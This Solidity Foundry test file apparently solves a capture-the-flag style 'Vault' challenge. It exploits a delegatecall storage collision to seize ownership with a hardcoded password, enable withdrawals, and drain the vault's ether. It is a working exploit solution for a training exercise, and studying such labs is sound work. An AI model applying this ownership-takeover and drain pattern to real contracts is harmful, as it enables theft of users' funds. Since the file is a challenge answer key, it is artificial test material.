// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(1);
    address palyer = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.

        // Step 1: Use delegatecall to change owner of Vault to `palyer`
        bytes32 correctPassword = bytes32("0x1234");
        (bool success,) =
            address(vault).call(abi.encodeWithSignature("changeOwner(bytes32,address)", correctPassword, palyer));
        require(success, "Failed to change owner");

        // Step 2: Open withdrawal by setting `canWithdraw` to true
        vault.openWithdraw();

        // Step 3: Withdraw all funds from the Vault
        vault.withdraw();

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}
